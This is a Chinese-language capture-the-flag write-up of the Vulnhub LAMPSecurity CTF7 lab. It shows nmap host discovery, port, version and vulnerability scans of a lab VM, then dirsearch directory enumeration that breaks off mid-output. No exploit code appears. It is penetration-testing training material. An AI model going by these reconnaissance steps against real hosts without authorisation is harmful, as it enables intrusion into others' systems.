{"pageProps":{"postData":{"id":"VulnhubLAMPSecurity CTF7","contentHtml":"<h1>LAMPSecurity: CTF7</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/lampsecurity-ctf7,86/\">https://www.vulnhub.com/entry/lampsecurity-ctf7,86/</a></p>\n</blockquote>\n<h2>主机发现端口扫描</h2>\n<ol>\n<li>\n<p>探测存活主机，<code>140</code>为靶机</p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>\n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-23 23:16 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00062</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00050</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.140</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00013</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">9</span>D:<span class=\"hljs-number\">12</span>:<span class=\"hljs-title function_ invoke__\">A9</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00032</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:F8:B3:<span class=\"hljs-number\">1</span>A (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.131</span>\nHost is up.\n</code></pre>\n</li>\n<li>\n<p>扫描主机所有端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.140</span>\n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-23 23:16 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.140</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00078</span>s latency).\nNot shown: <span class=\"hljs-number\">65507</span> filtered tcp <span class=\"hljs-title function_ invoke__\">ports</span> (no-response), <span class=\"hljs-number\">19</span> filtered tcp <span class=\"hljs-title function_ invoke__\">ports</span> (host-unreach)\nPORT      STATE  SERVICE\n<span class=\"hljs-number\">22</span>/tcp    open   ssh\n<span class=\"hljs-number\">80</span>/tcp    open   http\n<span class=\"hljs-number\">137</span>/tcp   closed netbios-ns\n<span class=\"hljs-number\">138</span>/tcp   closed netbios-dgm\n<span class=\"hljs-number\">139</span>/tcp   open   netbios-ssn\n<span class=\"hljs-number\">901</span>/tcp   open   samba-swat\n<span class=\"hljs-number\">5900</span>/tcp  closed vnc\n<span class=\"hljs-number\">8080</span>/tcp  open   http-proxy\n<span class=\"hljs-number\">10000</span>/tcp open   snet-sensor-mgmt\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">9</span>D:<span class=\"hljs-number\">12</span>:<span class=\"hljs-title function_ invoke__\">A9</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>扫描服务版本及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sT -sV -O -p22,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">139</span>,<span class=\"hljs-number\">901</span>,<span class=\"hljs-number\">5900</span>,<span class=\"hljs-number\">8080</span>,<span class=\"hljs-number\">10000</span>  <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.140</span>\n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-23 23:23 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.140</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00043</span>s latency).\n\nPORT      STATE  SERVICE     VERSION\n<span class=\"hljs-number\">22</span>/tcp    open   ssh         OpenSSH <span class=\"hljs-number\">5.3</span> (protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp    open   http        Apache httpd <span class=\"hljs-number\">2.2</span>.<span class=\"hljs-number\">15</span> ((CentOS))\n<span class=\"hljs-number\">139</span>/tcp   open   netbios-ssn Samba smbd <span class=\"hljs-number\">3</span>.X - <span class=\"hljs-number\">4</span>.<span class=\"hljs-title function_ invoke__\">X</span> (<span class=\"hljs-attr\">workgroup</span>: MYGROUP)\n<span class=\"hljs-number\">901</span>/tcp   open   http        Samba SWAT administration server\n<span class=\"hljs-number\">5900</span>/tcp  closed vnc\n<span class=\"hljs-number\">8080</span>/tcp  open   http        Apache httpd <span class=\"hljs-number\">2.2</span>.<span class=\"hljs-number\">15</span> ((CentOS))\n<span class=\"hljs-number\">10000</span>/tcp open   http        MiniServ <span class=\"hljs-number\">1.610</span> (Webmin httpd)\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">9</span>D:<span class=\"hljs-number\">12</span>:<span class=\"hljs-title function_ invoke__\">A9</span> (VMware)\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">2.6</span>.X|<span class=\"hljs-number\">3</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">2.6</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">3</span>\nOS details: Linux <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">32</span> - <span class=\"hljs-number\">3.13</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\n</code></pre>\n<p><code>MiniServ 1.610</code> 通过搜索发现是文件服务器</p>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-php\">nmap -script=vuln -p22,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">139</span>,<span class=\"hljs-number\">901</span>,<span class=\"hljs-number\">5900</span>,<span class=\"hljs-number\">8080</span>,<span class=\"hljs-number\">10000</span>  <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.140</span>\n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-23 23:26 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.140</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.0019</span>s latency).\n\nPORT      STATE  SERVICE\n<span class=\"hljs-number\">22</span>/tcp    open   ssh\n<span class=\"hljs-number\">80</span>/tcp    open   http\n|_http-csrf: Couldn<span class=\"hljs-string\">'t find any CSRF vulnerabilities.\n|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)\n| http-slowloris-check: \n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server'</span>s resources causing Denial Of Service.\n|       \n|     Disclosure date: <span class=\"hljs-number\">2009</span>-<span class=\"hljs-number\">09</span>-<span class=\"hljs-number\">17</span>\n|     References:\n|       https:<span class=\"hljs-comment\">//cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span>\n|_      http:<span class=\"hljs-comment\">//ha.ckers.org/slowloris/</span>\n| http-fileupload-exploiter: \n|   \n|     Couldn<span class=\"hljs-string\">'t find a file-type field.\n|   \n|     Couldn'</span>t find a file-type field.\n|   \n|     Couldn<span class=\"hljs-string\">'t find a file-type field.\n|   \n|_    Couldn'</span>t find a file-type field.\n|_http-trace: TRACE is enabled\n| http-<span class=\"hljs-class\"><span class=\"hljs-keyword\">enum</span>: \n|   /<span class=\"hljs-title\">webmail</span>/: <span class=\"hljs-title\">Mail</span> <span class=\"hljs-title\">folder</span>\n|   /<span class=\"hljs-title\">css</span>/: <span class=\"hljs-title\">Potentially</span> <span class=\"hljs-title\">interesting</span> <span class=\"hljs-title\">directory</span> <span class=\"hljs-title\">w</span>/ <span class=\"hljs-title\">listing</span> <span class=\"hljs-title\">on</span> '<span class=\"hljs-title\">apache</span>/2.2.15 (<span class=\"hljs-title\">centos</span>)'\n|   /<span class=\"hljs-title\">icons</span>/: <span class=\"hljs-title\">Potentially</span> <span class=\"hljs-title\">interesting</span> <span class=\"hljs-title\">folder</span> <span class=\"hljs-title\">w</span>/ <span class=\"hljs-title\">directory</span> <span class=\"hljs-title\">listing</span>\n|   /<span class=\"hljs-title\">img</span>/: <span class=\"hljs-title\">Potentially</span> <span class=\"hljs-title\">interesting</span> <span class=\"hljs-title\">directory</span> <span class=\"hljs-title\">w</span>/ <span class=\"hljs-title\">listing</span> <span class=\"hljs-title\">on</span> '<span class=\"hljs-title\">apache</span>/2.2.15 (<span class=\"hljs-title\">centos</span>)'\n|   /<span class=\"hljs-title\">inc</span>/: <span class=\"hljs-title\">Potentially</span> <span class=\"hljs-title\">interesting</span> <span class=\"hljs-title\">directory</span> <span class=\"hljs-title\">w</span>/ <span class=\"hljs-title\">listing</span> <span class=\"hljs-title\">on</span> '<span class=\"hljs-title\">apache</span>/2.2.15 (<span class=\"hljs-title\">centos</span>)'\n|   /<span class=\"hljs-title\">js</span>/: <span class=\"hljs-title\">Potentially</span> <span class=\"hljs-title\">interesting</span> <span class=\"hljs-title\">directory</span> <span class=\"hljs-title\">w</span>/ <span class=\"hljs-title\">listing</span> <span class=\"hljs-title\">on</span> '<span class=\"hljs-title\">apache</span>/2.2.15 (<span class=\"hljs-title\">centos</span>)'\n|<span class=\"hljs-title\">_</span>  /<span class=\"hljs-title\">webalizer</span>/: <span class=\"hljs-title\">Potentially</span> <span class=\"hljs-title\">interesting</span> <span class=\"hljs-title\">folder</span>\n|<span class=\"hljs-title\">_http</span>-<span class=\"hljs-title\">dombased</span>-<span class=\"hljs-title\">xss</span>: <span class=\"hljs-title\">Couldn</span>'<span class=\"hljs-title\">t</span> <span class=\"hljs-title\">find</span> <span class=\"hljs-title\">any</span> <span class=\"hljs-title\">DOM</span> <span class=\"hljs-title\">based</span> <span class=\"hljs-title\">XSS</span>.\n| <span class=\"hljs-title\">http</span>-<span class=\"hljs-title\">cookie</span>-<span class=\"hljs-title\">flags</span>: \n|   /: \n|     <span class=\"hljs-title\">PHPSESSID</span>: \n|<span class=\"hljs-title\">_</span>      <span class=\"hljs-title\">httponly</span> <span class=\"hljs-title\">flag</span> <span class=\"hljs-title\">not</span> <span class=\"hljs-title\">set</span>\n|<span class=\"hljs-title\">_http</span>-<span class=\"hljs-title\">stored</span>-<span class=\"hljs-title\">xss</span>: <span class=\"hljs-title\">Couldn</span>'<span class=\"hljs-title\">t</span> <span class=\"hljs-title\">find</span> <span class=\"hljs-title\">any</span> <span class=\"hljs-title\">stored</span> <span class=\"hljs-title\">XSS</span> <span class=\"hljs-title\">vulnerabilities</span>.\n139/<span class=\"hljs-title\">tcp</span>   <span class=\"hljs-title\">open</span>   <span class=\"hljs-title\">netbios</span>-<span class=\"hljs-title\">ssn</span>\n901/<span class=\"hljs-title\">tcp</span>   <span class=\"hljs-title\">open</span>   <span class=\"hljs-title\">samba</span>-<span class=\"hljs-title\">swat</span>\n5900/<span class=\"hljs-title\">tcp</span>  <span class=\"hljs-title\">closed</span> <span class=\"hljs-title\">vnc</span>\n8080/<span class=\"hljs-title\">tcp</span>  <span class=\"hljs-title\">open</span>   <span class=\"hljs-title\">http</span>-<span class=\"hljs-title\">proxy</span>\n| <span class=\"hljs-title\">http</span>-<span class=\"hljs-title\">cookie</span>-<span class=\"hljs-title\">flags</span>: \n|   /: \n|     <span class=\"hljs-title\">PHPSESSID</span>: \n|       <span class=\"hljs-title\">httponly</span> <span class=\"hljs-title\">flag</span> <span class=\"hljs-title\">not</span> <span class=\"hljs-title\">set</span>\n|   /<span class=\"hljs-title\">login</span>.<span class=\"hljs-title\">php</span>: \n|     <span class=\"hljs-title\">PHPSESSID</span>: \n|<span class=\"hljs-title\">_</span>      <span class=\"hljs-title\">httponly</span> <span class=\"hljs-title\">flag</span> <span class=\"hljs-title\">not</span> <span class=\"hljs-title\">set</span>\n| <span class=\"hljs-title\">http</span>-<span class=\"hljs-title\">slowloris</span>-<span class=\"hljs-title\">check</span>: \n|   <span class=\"hljs-title\">VULNERABLE</span>:\n|   <span class=\"hljs-title\">Slowloris</span> <span class=\"hljs-title\">DOS</span> <span class=\"hljs-title\">attack</span>\n|     <span class=\"hljs-title\">State</span>: <span class=\"hljs-title\">LIKELY</span> <span class=\"hljs-title\">VULNERABLE</span>\n|     <span class=\"hljs-title\">IDs</span>:  <span class=\"hljs-title\">CVE</span>:<span class=\"hljs-title\">CVE</span>-2007-6750\n|       <span class=\"hljs-title\">Slowloris</span> <span class=\"hljs-title\">tries</span> <span class=\"hljs-title\">to</span> <span class=\"hljs-title\">keep</span> <span class=\"hljs-title\">many</span> <span class=\"hljs-title\">connections</span> <span class=\"hljs-title\">to</span> <span class=\"hljs-title\">the</span> <span class=\"hljs-title\">target</span> <span class=\"hljs-title\">web</span> <span class=\"hljs-title\">server</span> <span class=\"hljs-title\">open</span> <span class=\"hljs-title\">and</span> <span class=\"hljs-title\">hold</span>\n|       <span class=\"hljs-title\">them</span> <span class=\"hljs-title\">open</span> <span class=\"hljs-title\">as</span> <span class=\"hljs-title\">long</span> <span class=\"hljs-title\">as</span> <span class=\"hljs-title\">possible</span>.  <span class=\"hljs-title\">It</span> <span class=\"hljs-title\">accomplishes</span> <span class=\"hljs-title\">this</span> <span class=\"hljs-title\">by</span> <span class=\"hljs-title\">opening</span> <span class=\"hljs-title\">connections</span> <span class=\"hljs-title\">to</span>\n|       <span class=\"hljs-title\">the</span> <span class=\"hljs-title\">target</span> <span class=\"hljs-title\">web</span> <span class=\"hljs-title\">server</span> <span class=\"hljs-title\">and</span> <span class=\"hljs-title\">sending</span> <span class=\"hljs-title\">a</span> <span class=\"hljs-title\">partial</span> <span class=\"hljs-title\">request</span>. <span class=\"hljs-title\">By</span> <span class=\"hljs-title\">doing</span> <span class=\"hljs-title\">so</span>, <span class=\"hljs-title\">it</span> <span class=\"hljs-title\">starves</span>\n|       <span class=\"hljs-title\">the</span> <span class=\"hljs-title\">http</span> <span class=\"hljs-title\">server</span>'<span class=\"hljs-title\">s</span> <span class=\"hljs-title\">resources</span> <span class=\"hljs-title\">causing</span> <span class=\"hljs-title\">Denial</span> <span class=\"hljs-title\">Of</span> <span class=\"hljs-title\">Service</span>.\n|       \n|     <span class=\"hljs-title\">Disclosure</span> <span class=\"hljs-title\">date</span>: 2009-09-17\n|     <span class=\"hljs-title\">References</span>:\n|       <span class=\"hljs-title\">https</span>://<span class=\"hljs-title\">cve</span>.<span class=\"hljs-title\">mitre</span>.<span class=\"hljs-title\">org</span>/<span class=\"hljs-title\">cgi</span>-<span class=\"hljs-title\">bin</span>/<span class=\"hljs-title\">cvename</span>.<span class=\"hljs-title\">cgi</span>?<span class=\"hljs-title\">name</span>=<span class=\"hljs-title\">CVE</span>-2007-6750\n|<span class=\"hljs-title\">_</span>      <span class=\"hljs-title\">http</span>://<span class=\"hljs-title\">ha</span>.<span class=\"hljs-title\">ckers</span>.<span class=\"hljs-title\">org</span>/<span class=\"hljs-title\">slowloris</span>/\n|<span class=\"hljs-title\">_http</span>-<span class=\"hljs-title\">vuln</span>-<span class=\"hljs-title\">cve2017</span>-1001000: <span class=\"hljs-title\">ERROR</span>: <span class=\"hljs-title\">Script</span> <span class=\"hljs-title\">execution</span> <span class=\"hljs-title\">failed</span> (<span class=\"hljs-title\">use</span> -<span class=\"hljs-title\">d</span> <span class=\"hljs-title\">to</span> <span class=\"hljs-title\">debug</span>)\n|<span class=\"hljs-title\">_http</span>-<span class=\"hljs-title\">trace</span>: <span class=\"hljs-title\">TRACE</span> <span class=\"hljs-title\">is</span> <span class=\"hljs-title\">enabled</span>\n| <span class=\"hljs-title\">http</span>-<span class=\"hljs-title\">enum</span>: \n|   /<span class=\"hljs-title\">login</span>.<span class=\"hljs-title\">php</span>: <span class=\"hljs-title\">Possible</span> <span class=\"hljs-title\">admin</span> <span class=\"hljs-title\">folder</span>\n|   /<span class=\"hljs-title\">phpmyadmin</span>/: <span class=\"hljs-title\">phpMyAdmin</span>\n|   /<span class=\"hljs-title\">docs</span>/: <span class=\"hljs-title\">Potentially</span> <span class=\"hljs-title\">interesting</span> <span class=\"hljs-title\">directory</span> <span class=\"hljs-title\">w</span>/ <span class=\"hljs-title\">listing</span> <span class=\"hljs-title\">on</span> '<span class=\"hljs-title\">apache</span>/2.2.15 (<span class=\"hljs-title\">centos</span>)'\n|   /<span class=\"hljs-title\">icons</span>/: <span class=\"hljs-title\">Potentially</span> <span class=\"hljs-title\">interesting</span> <span class=\"hljs-title\">folder</span> <span class=\"hljs-title\">w</span>/ <span class=\"hljs-title\">directory</span> <span class=\"hljs-title\">listing</span>\n|<span class=\"hljs-title\">_</span>  /<span class=\"hljs-title\">inc</span>/: <span class=\"hljs-title\">Potentially</span> <span class=\"hljs-title\">interesting</span> <span class=\"hljs-title\">directory</span> <span class=\"hljs-title\">w</span>/ <span class=\"hljs-title\">listing</span> <span class=\"hljs-title\">on</span> '<span class=\"hljs-title\">apache</span>/2.2.15 (<span class=\"hljs-title\">centos</span>)'\n10000/<span class=\"hljs-title\">tcp</span> <span class=\"hljs-title\">open</span>   <span class=\"hljs-title\">snet</span>-<span class=\"hljs-title\">sensor</span>-<span class=\"hljs-title\">mgmt</span>\n<span class=\"hljs-title\">MAC</span> <span class=\"hljs-title\">Address</span>: 00:0<span class=\"hljs-title\">C</span>:29:9<span class=\"hljs-title\">D</span>:12:<span class=\"hljs-title\">A9</span> (<span class=\"hljs-title\">VMware</span>)\n\n<span class=\"hljs-title\">Host</span> <span class=\"hljs-title\">script</span> <span class=\"hljs-title\">results</span>:\n| <span class=\"hljs-title\">smb</span>-<span class=\"hljs-title\">vuln</span>-<span class=\"hljs-title\">regsvc</span>-<span class=\"hljs-title\">dos</span>: \n|   <span class=\"hljs-title\">VULNERABLE</span>:\n|   <span class=\"hljs-title\">Service</span> <span class=\"hljs-title\">regsvc</span> <span class=\"hljs-title\">in</span> <span class=\"hljs-title\">Microsoft</span> <span class=\"hljs-title\">Windows</span> <span class=\"hljs-title\">systems</span> <span class=\"hljs-title\">vulnerable</span> <span class=\"hljs-title\">to</span> <span class=\"hljs-title\">denial</span> <span class=\"hljs-title\">of</span> <span class=\"hljs-title\">service</span>\n|     <span class=\"hljs-title\">State</span>: <span class=\"hljs-title\">VULNERABLE</span>\n|       <span class=\"hljs-title\">The</span> <span class=\"hljs-title\">service</span> <span class=\"hljs-title\">regsvc</span> <span class=\"hljs-title\">in</span> <span class=\"hljs-title\">Microsoft</span> <span class=\"hljs-title\">Windows</span> 2000 <span class=\"hljs-title\">systems</span> <span class=\"hljs-title\">is</span> <span class=\"hljs-title\">vulnerable</span> <span class=\"hljs-title\">to</span> <span class=\"hljs-title\">denial</span> <span class=\"hljs-title\">of</span> <span class=\"hljs-title\">service</span> <span class=\"hljs-title\">caused</span> <span class=\"hljs-title\">by</span> <span class=\"hljs-title\">a</span> <span class=\"hljs-title\">null</span> <span class=\"hljs-title\">deference</span>\n|       <span class=\"hljs-title\">pointer</span>. <span class=\"hljs-title\">This</span> <span class=\"hljs-title\">script</span> <span class=\"hljs-title\">will</span> <span class=\"hljs-title\">crash</span> <span class=\"hljs-title\">the</span> <span class=\"hljs-title\">service</span> <span class=\"hljs-title\">if</span> <span class=\"hljs-title\">it</span> <span class=\"hljs-title\">is</span> <span class=\"hljs-title\">vulnerable</span>. <span class=\"hljs-title\">This</span> <span class=\"hljs-title\">vulnerability</span> <span class=\"hljs-title\">was</span> <span class=\"hljs-title\">discovered</span> <span class=\"hljs-title\">by</span> <span class=\"hljs-title\">Ron</span> <span class=\"hljs-title\">Bowes</span>\n|       <span class=\"hljs-title\">while</span> <span class=\"hljs-title\">working</span> <span class=\"hljs-title\">on</span> <span class=\"hljs-title\">smb</span>-<span class=\"hljs-title\">enum</span>-<span class=\"hljs-title\">sessions</span>.\n|<span class=\"hljs-title\">_</span>          \n|<span class=\"hljs-title\">_smb</span>-<span class=\"hljs-title\">vuln</span>-<span class=\"hljs-title\">ms10</span>-054: <span class=\"hljs-title\">false</span>\n| <span class=\"hljs-title\">smb</span>-<span class=\"hljs-title\">vuln</span>-<span class=\"hljs-title\">cve2009</span>-3103: \n|   <span class=\"hljs-title\">VULNERABLE</span>:\n|   <span class=\"hljs-title\">SMBv2</span> <span class=\"hljs-title\">exploit</span> (<span class=\"hljs-title\">CVE</span>-2009-3103, <span class=\"hljs-title\">Microsoft</span> <span class=\"hljs-title\">Security</span> <span class=\"hljs-title\">Advisory</span> 975497)\n|     <span class=\"hljs-title\">State</span>: <span class=\"hljs-title\">VULNERABLE</span>\n|     <span class=\"hljs-title\">IDs</span>:  <span class=\"hljs-title\">CVE</span>:<span class=\"hljs-title\">CVE</span>-2009-3103\n|           <span class=\"hljs-title\">Array</span> <span class=\"hljs-title\">index</span> <span class=\"hljs-title\">error</span> <span class=\"hljs-title\">in</span> <span class=\"hljs-title\">the</span> <span class=\"hljs-title\">SMBv2</span> <span class=\"hljs-title\">protocol</span> <span class=\"hljs-title\">implementation</span> <span class=\"hljs-title\">in</span> <span class=\"hljs-title\">srv2</span>.<span class=\"hljs-title\">sys</span> <span class=\"hljs-title\">in</span> <span class=\"hljs-title\">Microsoft</span> <span class=\"hljs-title\">Windows</span> <span class=\"hljs-title\">Vista</span> <span class=\"hljs-title\">Gold</span>, <span class=\"hljs-title\">SP1</span>, <span class=\"hljs-title\">and</span> <span class=\"hljs-title\">SP2</span>,\n|           <span class=\"hljs-title\">Windows</span> <span class=\"hljs-title\">Server</span> 2008 <span class=\"hljs-title\">Gold</span> <span class=\"hljs-title\">and</span> <span class=\"hljs-title\">SP2</span>, <span class=\"hljs-title\">and</span> <span class=\"hljs-title\">Windows</span> 7 <span class=\"hljs-title\">RC</span> <span class=\"hljs-title\">allows</span> <span class=\"hljs-title\">remote</span> <span class=\"hljs-title\">attackers</span> <span class=\"hljs-title\">to</span> <span class=\"hljs-title\">execute</span> <span class=\"hljs-title\">arbitrary</span> <span class=\"hljs-title\">code</span> <span class=\"hljs-title\">or</span> <span class=\"hljs-title\">cause</span> <span class=\"hljs-title\">a</span>\n|           <span class=\"hljs-title\">denial</span> <span class=\"hljs-title\">of</span> <span class=\"hljs-title\">service</span> (<span class=\"hljs-title\">system</span> <span class=\"hljs-title\">crash</span>) <span class=\"hljs-title\">via</span> <span class=\"hljs-title\">an</span> &#x26; (<span class=\"hljs-title\">ampersand</span>) <span class=\"hljs-title\">character</span> <span class=\"hljs-title\">in</span> <span class=\"hljs-title\">a</span> <span class=\"hljs-title\">Process</span> <span class=\"hljs-title\">ID</span> <span class=\"hljs-title\">High</span> <span class=\"hljs-title\">header</span> <span class=\"hljs-title\">field</span> <span class=\"hljs-title\">in</span> <span class=\"hljs-title\">a</span> <span class=\"hljs-title\">NEGOTIATE</span>\n|           <span class=\"hljs-title\">PROTOCOL</span> <span class=\"hljs-title\">REQUEST</span> <span class=\"hljs-title\">packet</span>, <span class=\"hljs-title\">which</span> <span class=\"hljs-title\">triggers</span> <span class=\"hljs-title\">an</span> <span class=\"hljs-title\">attempted</span> <span class=\"hljs-title\">dereference</span> <span class=\"hljs-title\">of</span> <span class=\"hljs-title\">an</span> <span class=\"hljs-title\">out</span>-<span class=\"hljs-title\">of</span>-<span class=\"hljs-title\">bounds</span> <span class=\"hljs-title\">memory</span> <span class=\"hljs-title\">location</span>,\n|           <span class=\"hljs-title\">aka</span> \"<span class=\"hljs-title\">SMBv2</span> <span class=\"hljs-title\">Negotiation</span> <span class=\"hljs-title\">Vulnerability</span>.\"\n|           \n|     <span class=\"hljs-title\">Disclosure</span> <span class=\"hljs-title\">date</span>: 2009-09-08\n|     <span class=\"hljs-title\">References</span>:\n|       <span class=\"hljs-title\">https</span>://<span class=\"hljs-title\">cve</span>.<span class=\"hljs-title\">mitre</span>.<span class=\"hljs-title\">org</span>/<span class=\"hljs-title\">cgi</span>-<span class=\"hljs-title\">bin</span>/<span class=\"hljs-title\">cvename</span>.<span class=\"hljs-title\">cgi</span>?<span class=\"hljs-title\">name</span>=<span class=\"hljs-title\">CVE</span>-2009-3103\n|<span class=\"hljs-title\">_</span>      <span class=\"hljs-title\">http</span>://<span class=\"hljs-title\">www</span>.<span class=\"hljs-title\">cve</span>.<span class=\"hljs-title\">mitre</span>.<span class=\"hljs-title\">org</span>/<span class=\"hljs-title\">cgi</span>-<span class=\"hljs-title\">bin</span>/<span class=\"hljs-title\">cvename</span>.<span class=\"hljs-title\">cgi</span>?<span class=\"hljs-title\">name</span>=<span class=\"hljs-title\">CVE</span>-2009-3103\n|<span class=\"hljs-title\">_smb</span>-<span class=\"hljs-title\">vuln</span>-<span class=\"hljs-title\">ms10</span>-061: <span class=\"hljs-title\">false</span>\n</span></code></pre>\n<p>发现了很多可能会感兴趣的目录，并扫出了<code>smb</code>的漏洞，但是看描述可能只是对<code>windows</code>有害</p>\n<p>优先级大概是<code>80</code>→<code>8080</code>→<code>10000</code>→<code>also</code></p>\n</li>\n</ol>\n<h2>web渗透</h2>\n<h3>80端口</h3>\n<ol>\n<li>\n<p>访问网站<code>http://192.168.75.140/</code> ，title为 <code>Mad Irish Hacking Academy</code></p>\n</li>\n<li>\n<p>扫描网站目录</p>\n<pre><code class=\"hljs language-php\">dirsearch -u <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.140</span>\n<span class=\"hljs-comment\">//                 </span>\n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">12</span>] <span class=\"hljs-number\">200</span> -    <span class=\"hljs-number\">5</span>KB - /about                                            \n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">23</span>] <span class=\"hljs-number\">404</span> -  <span class=\"hljs-number\">294</span>B  - /assets/fckeditor                                 \n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">23</span>] <span class=\"hljs-number\">301</span> -  <span class=\"hljs-number\">317</span>B  - /assets  ->  http:<span class=\"hljs-comment\">//192.168.75.140/assets/</span>\n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">23</span>] <span class=\"hljs-number\">404</span> -  <span class=\"hljs-number\">289</span>B  - /assets/file\n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">23</span>] <span class=\"hljs-number\">404</span> -  <span class=\"hljs-number\">298</span>B  - /assets/npm-debug.log\n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">23</span>] <span class=\"hljs-number\">404</span> -  <span class=\"hljs-number\">297</span>B  - /assets/pubspec.yaml                              \n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">23</span>] <span class=\"hljs-number\">200</span> -    <span class=\"hljs-number\">2</span>KB - /assets/                                          \n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">23</span>] <span class=\"hljs-number\">404</span> -  <span class=\"hljs-number\">297</span>B  - /assets/js/fckeditor                              \n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">24</span>] <span class=\"hljs-number\">301</span> -  <span class=\"hljs-number\">333</span>B  - /backups  ->  http:<span class=\"hljs-comment\">//192.168.75.140/backups/?action=backups</span>\n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">26</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">290</span>B  - /cgi-bin/                                         \n[<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">29</span>] <span class=\"hljs-number\">200</span> -    <span class=\"hljs-number\">5</span>KB - /contact                                          \n[<span class=\"hljs-number\">23</span>:<span 